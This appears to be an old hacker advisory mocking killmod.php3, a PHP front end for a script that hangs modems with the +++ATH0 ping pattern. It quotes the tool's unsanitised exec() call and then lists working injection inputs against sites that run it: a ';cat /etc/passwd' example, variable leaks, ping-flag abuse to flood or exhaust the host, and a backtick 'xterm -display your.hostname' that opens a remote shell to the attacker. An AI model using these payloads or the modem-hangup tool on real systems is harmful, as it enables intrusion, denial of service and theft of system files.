           | A Few Words Regarding killmod.php3 from Wyzewun |

I was crawling around Packetstorm about fifteen minutes ago and stumbled upon
killmod.php3, a strange and sad creation best described by its creators...

killmod.php3 is a php front end that calls a simple shell script (killmod.sh)
and allows you to use the +++ath0 bug to hang up older modems.

HISTORY:

This originally was a project started by me (jigz) because I had created a
lame shell script that just would ping with the `+++ATH0' pattern. I was too
lazy to type "ping -p 2b2b2b415448300d [target]", so I made the script so I
could just "killmod [target]". Then I discovered PHP and made a lame PHP
document that called the lame script, so I could do it from a website.
Everything was fine until my friend monkey decided to try and exploit it. I
figured it would be very unlikely. But due to the poorly written shell script,
submitting the proper hex characters to the form (something like `;cat
/etc/passwd') would run and print whatever was after the ";" and effectively
pissed me off. After I discovered his wrongdoing and he discovered I had
backdoored him, we signed a full disclosure treaty, which has worked out for
the better. We worked together to create this PHP document that effectively
weeds out all the nasty characters ( ; | < > & ). Monkey did the PHP coding,
and I modified it to look pretty and added a few things.

Needless to say, the Hollywood dream story is enough to make you puke. ;-)
So let's take a look at how this thing works closer. The important stuff in
the script would be *this* in killmod.php3:

echo("killing $killmod_address");
exec("/home/httpd/cgi-bin/killmod.sh $killmod_address > /home/httpd/html/killmod.results");

And *this* in killmod.sh:

/bin/ping -c 5 -p 2b2b2b415448300d $1

Okay, great, that's simple enough. Now let's think of a few ways to make the
lives of those with killmod.php3 on their boxen interesting...

Look at their system variables, eg. Make your input "$MACHTYPE" and the
output will be something to the effect of...
ping: cannot resolve i386--freebsd3.4: Host name lookup failure

Make your input string "-a whatever.com" and send in a couple of hundred
requests. Things will get a tad noisy over at l33t0 boy's side. ;P

Make your input string "-i 1000000 whatever.com" and carry on sending requests
until you figure the host's system resources have been shot to hell.

Make your input `xterm -display your.hostname` to spawn an X-Windoze shell to
your box. ;-) In each example I'd made so far, the inverted comma's were to be
ignored - this one is the exception.
